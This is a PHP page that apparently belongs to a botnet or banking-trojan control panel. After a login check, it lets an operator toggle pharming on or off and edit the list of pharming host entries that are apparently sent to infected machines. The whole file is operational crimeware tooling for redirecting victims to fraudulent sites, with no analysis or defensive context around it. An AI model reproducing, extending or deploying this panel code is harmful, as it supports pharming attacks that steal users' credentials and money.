<?php
@session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }
require_once('../../includes.php');
	
$Pharming = $DB->Select("SELECT * FROM pharming");



?>
<h2><font face="Tahoma" size="4" color="#666666">Pharming Hosts
</font></h2>
<font face="Tahoma" size="1">
<div id='mensajebot' name='mensajebot' align='center' style="color:#FF0000"></div>
</font>
<form id='frm_findinfo'>
<form method="POST" action="">
<table width='100%' border='1' cellpadding='3' style='font-size: 9px; border-collapse: collapse; background-color: #000000;' background="archivos/imagen/bg.gif" bordercolor="#666666">
<tr>
	<td width='150px' align='left'><font color="#666666" face="Tahoma"><b>
	<font size="1"> Pharming status: </font></b></font></td>
	<td align='left'><div>
</font>
<span style="margin-left:0px">

<label>
<font color="#666666" face="Tahoma">
<font size="1">
<?php

if( $Pharming[0]['status'] == "Pharming.ON" ){
	echo '
		<!--  -->
		<label>
			<select name="status" id="status" size="1" style="font-family: Tahoma; color: #00CC00; font-size: 8pt; border: 1px solid #000000; background-color: #000000">

				<option selected="selected" value="SIN">Sin Pharming</option>
				<option selected="selected" value="OFF">Pharming OFF</option>

				<option selected="selected" value="ON">Pharming ON</option>

			</select>
		</label>


	' ;
} 
if( $Pharming[0]['status'] == "Pharming.OFF" ){

	echo '
		<!--  -->
		
		<label>
			<select name="status" id="status" size="1" style="font-family: Tahoma; font-size: 8pt; color: #FF0000; border: 1px solid #000000; background-color: #000000">
				<option selected="selected" value="SIN">Sin Pharming</option>
				<option selected="selected" value="ON">Pharming ON</option>
				<option selected="selected" value="OFF">Pharming OFF</option>
			</select>
		</label>
		
	' ;

}
if( $Pharming[0]['status'] == "Pharming.NOT" ){
	echo '
		<!--  -->
		<label>
			<select name="status" id="status" size="1" style="font-family: Tahoma; color: #3399FF; font-size: 8pt; border: 1px solid #000000; background-color: #000000">
				<option selected="selected" value="ON">Pharming ON</option>
				<option selected="selected" value="OFF">Pharming OFF</option>
				<option selected="selected" value="SIN">Sin Pharming</option>
			</select>
		</label>


	' ;
}
?>
</font>
</font>
</label>
</span>
</div></td>
</tr>
<tr>
	<td align='left' colspan="2"><div>
<p align="center">
<span style="margin-left:0px" id="table_estadisticas" >
<!--  -->
<textarea name="pharming" cols="70" rows="8" id="pharming" style="border:1px solid #000000; width: 820; height:196; font-family:Tahoma; color:#666666; font-size:8pt; background-color:#000000" ><?php echo $Pharming[0]['pharming'] ; ?></textarea>

</span>
</div></td>
</tr>



<tr>
	<td align='left' colspan="2">





<input type='button' value='Save Pharming'  onclick='submitpharming();' style="font-family: Tahoma; font-size: 8pt; border: 1px solid #000000; ; color:#666666; background-color:#000000"></td>
</tr>



<table>

</form>



<hr size='1' color='#666666'>

